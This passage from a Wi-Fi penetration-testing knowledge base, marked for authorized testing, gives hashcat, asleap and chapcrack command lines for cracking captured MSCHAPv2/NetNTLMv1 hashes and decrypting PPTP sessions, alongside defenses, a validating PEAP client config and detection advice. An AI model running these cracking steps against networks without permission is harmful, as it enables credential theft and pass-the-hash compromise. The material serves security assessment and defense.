#   -> bob::::aabbcc...:1a2b3c4d5e6f7a8b

hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/best64.rule -O -w 3      # start here
hashcat -m 5500 -a 0 hash.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule
hashcat -m 5500 -a 3 hash.txt '?u?l?l?l?l?l?d?d?s'                         # policy-shaped mask
# sanity line (password = "hashcat"):
# u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

`asleap` alternative (LEAP live / quick): `asleap -C <chal> -R <resp> -W wordlist.txt`, or
precompute `genkeys -r wordlist.txt -f hashfile.dat -n index.idx` then `asleap -r cap.pcap -f
hashfile.dat -n index.idx -s` (exact-match only, no rules — prefer hashcat).

### Route B — DES reduction (guaranteed, strength-independent)

```bash
chapcrack parse -p pptp.pcap                    # -> $99$ token (K3 2^16 cracked locally)
#   submit $99$ to https://crack.sh (FPGA, DES-56 ≤~26h). FREE+INSTANT if challenge==1122334455667788
chapcrack decrypt -p pptp.pcap -n <NTHASH>      # decrypt captured PPTP/MPPE session
hashcat -m 1000 -a 0 nthash.txt wordlist.txt -r rules/best64.rule   # NT hash -> plaintext for the report
#   local-only (no crack.sh): assless-chaps → hashcat -m 14000 (dictionary-bound; K3 local, send K1/K2 only)
```

### Gotchas

- **#1 failure: wrong field layout** — swapping response (48 hex) and challenge (16 hex) in
  5500. 15-char challenge = dropped a leading `0`.
- **Username exact case** — `Bob`≠`bob`≠`bob@corp.local`. Capture the **inner** identity, not
  the anonymous outer.
- **5500 ≠ 5600** — 5600 is NetNTLMv2, a different construction.
- **ESS (NetNTLMv1+ESS):** LM field carries the client challenge zero-padded (`LM[8:24]==00…`);
  hashcat auto-detects and handles it, but the **free crack.sh `1122334455667788` table does
  not apply**. Force the magic challenge when you control capture to keep the free table in play.
- **hostapd-wpe already computed the ChallengeHash** — use its 8-byte field directly; don't
  re-SHA1 the raw challenges.
- **crack.sh sends credential material off-box** — a scope/data-handling decision; prefer local
  `-m 5500`/`14000` first.

### Defense

**Kill the exposure:** PPTP — **do not use** (treat as cleartext); migrate PEAP/TTLS-MSCHAPv2
→ **EAP-TLS** (client certs, no password on the wire; TEAP/PEAP-TLS also safe). **If you must
keep PEAP/TTLS:** enforce **server-cert validation on every client** — pin the **CA**, specify
the exact **RADIUS server name (SAN DNS; Windows ignores CN when a SAN exists)**, and **forbid
accepting new/unknown certs** — pushed by **MDM/GPO/Intune**, never hand-configured. Enable
PEAP **crypto-binding** (FreeRADIUS `crypto_binding = require`). Strong passwords **slow** but
do **not** stop capture, the DES break, or pass-the-hash.

```ini
# Known-good validating wpa_supplicant client (the MDM template; pass criterion for your rogue test)
network={
    ssid="CorpWifi"
    key_mgmt=WPA-EAP
    eap=PEAP
    ca_cert="/etc/ssl/certs/corp-ca-chain.pem"   # pin the exact internal CA (NOT system store)
    domain_suffix_match="radius.corp.local"       # server-name check; use domain_match= for EXACT
    anonymous_identity="anonymous@corp.local"      # hide real username in Phase 1
    identity="bob@corp.local"
    phase2="auth=MSCHAPV2"
}
```

A client with `ca_cert` + `domain_(suffix_)match` set correctly **refuses every eaphammer /
hostapd-wpe self-signed rogue** — that is the test's pass criterion, and a positive finding.
**Detect:** WIDS/WIPS for duplicate ESSID/new BSSID, wrong RADIUS cert thumbprint, anomalous
EAP offers, EAP-NAK bursts, 802.1X auth-failure spikes. **IR:** rotate any credential that may
have traversed an MSCHAPv2 exchange; treat NT-hash exposure as full AD compromise (pass-the-hash).

---

## 6. Cross-cutting pro tips (mid-competition speed)

- **Spend the first minutes on recon.** "transition or WPA3-only?" and "which EAP method?"
  decide whether any offline path exists. Use the §1 `awk` one-liner and the §4 tshark line.
- **Keep an RSN-IE / EAP-type cheat sheet** (AKM `:8`=SAE, `:2`=PSK, `:24`=SAE-EXT-KEY, MFPR=PMF;
  EAP 25=PEAP, 21=TTLS, 13=TLS, 6=GTC) — reading it right saves chasing an uncrackable target.
- **Capture on Kali, crack on the Mac GPU.** MSCHAPv2/NetNTLMv1 (5500) is fast → `rockyou +
  best64 / OneRuleToRuleThemAll` before masks; build an org-shaped wordlist (`Winter2026!`).
  If you got TTLS/PAP or GTC, skip cracking — you already have cleartext.
- **Prove injection before trusting any result** (`aireplay-ng --test` / `--inject-test`) —
  a dishonest card gives a false "safe" on FragAttacks and no flush on Kr00k.
- **Right card for the job:** RTL8188EUS = recon/monitor/injection + Kr00k (2.4 GHz); get an
  **AWUS036ACM** for FragAttacks mixed mode and an **Atheros (AWUS036NHA/WN722N v1)** for
  dragondrain/dragontime. The RTL8188EUS does **none** of the Atheros-only or 5/6 GHz work.
- **Retry everything that times out** (KRACK, FragAttacks, Kr00k all under-report). One timeout
  = "inconclusive," never "safe." Three clean negatives + confirmed-patched firmware = safe.
- **Reframe WPA3-only / EAP-TLS / patched-fleet as POSITIVE findings** — the deliverable is a
  posture assessment (transition off? H2E on? 2.11+? cert validation enforced? PMF required?),
  not a cracked secret. Correct the myths in your own notes: no hashcat mode for SAE PSK;
  changing the Wi-Fi password doesn't fix KRACK; PMF doesn't fix Kr00k; neither PMF nor EAP-TLS
  stops FragAttacks; password strength doesn't save MSCHAPv2.

*Compiled 2026-11-14 for the Wi-Fi Command Center knowledge base — authorized testing only.
Source files synthesized: wpa3-sae-dragonblood.md, krack.md, kr00k-fragattacks.md,
wpa-enterprise-eap.md, mschapv2-cracking.md (full primary-source bibliographies retained in those files).*
